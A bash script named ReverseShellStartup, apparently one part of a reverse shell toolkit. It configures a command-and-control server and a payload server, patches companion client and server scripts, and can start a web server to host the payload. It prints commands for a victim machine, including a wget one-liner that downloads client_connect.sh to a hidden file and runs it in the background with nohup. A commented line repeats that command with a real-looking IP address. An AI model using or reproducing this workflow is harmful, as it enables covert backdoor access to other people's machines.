#!/usr/bin/env bash

# ReverseShellStartup

# Author : Bobby Valenzuela
# Created : 11th January 2023

# Description:
# Prints on screen-instructions asking for the ip/port details of the cnc server (hacker) and where the payload is to be hosted. 
# This scrpt also edits the client_payload.py, server_shell.py, and client_connect.sh to reflected the command line input.
# Finally, this script tells you exactly which commands to run on CNC server and client machine to initiate a reverse shell (backdoor) attack. 

# Make sure we have python3
if ! which python3 &> /dev/null
then
    echo "This requires python3. Exiting..." && exit 1
fi


print_colored()
{

    [[ -z "$1" ||  -z "$2" ]] && echo "Usage: print_colored <color> <text>" && exit 1
    
    auto_print_newline=''
    [[ "$3" == 'no' ]] && auto_print_newline='-n' 

    case "$1" in
        "grey" | "GREY")        echo -e ${auto_print_newline} "\033[90m$2 \033[00m" ;;
        "red" | "RED")          echo -e ${auto_print_newline} "\033[91m$2 \033[00m" ;;
        "green" | "GREEN")      echo -e ${auto_print_newline} "\033[92m$2 \033[00m" ;;
        "yellow" | "YELLOW")    echo -e ${auto_print_newline} "\033[93m$2 \033[00m" ;;
        "blue" | "BLUE")        echo -e ${auto_print_newline} "\033[94m$2 \033[00m" ;;
        "purple" | "PURPLE")    echo -e ${auto_print_newline} "\033[95m$2 \033[00m" ;;
        "cyan" | "CYAN")        echo -e ${auto_print_newline} "\033[96m$2 \033[00m" ;;
        "white" | "WHITE")      echo -e ${auto_print_newline} "\033[96m$2 \033[00m" ;;
        *   )               echo -e ${auto_print_newline} "\033[96m$2 \033[00m" ;;
    esac


}

################################
# Sart main program
#==============================

 # Validate/save CNC ip:port

CNC_SERVER_SAVED=0

while [[ ${CNC_SERVER_SAVED} -ne 1 ]] 
do
    read -p "Enter CNC Server's Public IP and Port to listen on (this machine): " CNC_SERVER
    [[ ${CNC_SERVER} =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}\:[0-9]{1,4}$ ]] && CNC_SERVER_SAVED=1 && continue
    print_colored "red" "Status: Invalid Input\n" "no"
    printf "  Format: <IP>:<PORT>\n"
    printf "   Example: 0.0.0.0:8080\n\n"

done

print_colored "green" "CNC server saved: ${CNC_SERVER}\n\n"



 # Validate/save payload server ip:port

PAYLOAD_SERVER_SAVED=0

while [[ ${PAYLOAD_SERVER_SAVED} -ne 1 ]] 
do
    read -p "Enter payload server IP and Port : " PAYLOAD_SERVER
    [[ "${PAYLOAD_SERVER}" == "${CNC_SERVER}" ]] && print_colored "red" "Cannot be on the same port as CNC server\n" && continue
    
    
    [[ ${PAYLOAD_SERVER} =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}\:[0-9]{1,4}$ ]] && PAYLOAD_SERVER_SAVED=1 && continue
    print_colored "red" "Status: Invalid Input\n" "no"
    printf "  Format: <IP>:<PORT>\n"
    printf "   Example: 0.0.0.0:8080\n\n"

done

print_colored "green" "Payload server saved: ${PAYLOAD_SERVER}\n\n"

# Get host details thus far
CNC_HOST=$(echo ${CNC_SERVER} | sed 's/:.*//')
CNC_PORT=$(echo ${CNC_SERVER} | sed 's/^.*://')
PAYLOAD_HOST=$(echo ${PAYLOAD_SERVER} | sed 's/:.*//')
PAYLOAD_PORT=$(echo ${PAYLOAD_SERVER} | sed 's/^.*://')

# If we're using same host for CNC and payload host
# see if want to run simple python webserver
[[ "${PAYLOAD_HOST}" == "${CNC_HOST}" ]] && echo "Do you want to start a simple web server using python to host your reverse shell payload? (Y/N)" && read -p "Default (Y): " START_PYTHON_SERVER

# Start server if requested
[[ "${START_PYTHON_SERVER,,}" != 'n' && "${PAYLOAD_HOST}" == "${CNC_HOST}" ]] && python3 -m http.server ${PAYLOAD_PORT} &> /dev/null & 

# Verify if server is running
SERVER_PID=$(ps aux | grep 'python3 -m http.server 8080' | egrep -v 'grep' | awk '{ print $2 }')
[[ "${SERVER_PID}" -gt 0 ]] &&  print_colored "green" "\nPython web server started on port ${PAYLOAD_PORT}\n\n" "no" 

# Replace scripts with proper details
sed -i -e "s/<cnc_ip>/${CNC_HOST}/g" -e "s/<cnc_port>/${CNC_PORT}/g" -e "s/<payload_server_ip>/${PAYLOAD_HOST}/g" -e "s/<payload_server_port>/${PAYLOAD_PORT}/g" client_connect.sh  &> /dev/null
sed -i -e "s/<cnc_ip>/${CNC_HOST}/g" -e "s/<cnc_port>/${CNC_PORT}/g" -e "s/<payload_server_ip>/${PAYLOAD_HOST}/g" -e "s/<payload_server_port>/${PAYLOAD_PORT}/g" client_payload.py &> /dev/null
sed -i -e "s/<cnc_ip>/${CNC_HOST}/g" -e "s/<cnc_port>/${CNC_PORT}/g" -e "s/<payload_server_ip>/${PAYLOAD_HOST}/g" -e "s/<payload_server_port>/${PAYLOAD_PORT}/g" server_shell.py  &> /dev/null


echo "All client/server scripts have been updated with the peoper host/port information provided"
print_colored "cyan" "\nEnter these commands to continue:\\n"
# printf "\t[ON CNC SERVER] \n\t"
print_colored "cyan" "\t[ON CNC SERVER] This listens for inconming connections from the client.  \n" "no"
printf "\tpython3 server_shell.py\n\n"

print_colored "cyan" "\t[ON CLIENT] This command starts a connection to CNC server.\n" "no"

printf "\t{ wget -q -O .c ${PAYLOAD_HOST}:${PAYLOAD_PORT}/client_connect.sh ; } && { nohup bash .c &> /dev/null & }\n\n"




# { wget -q -O .c 96.126.97.119:8080/connect.sh ; } && { nohup bash .c &> /dev/null & }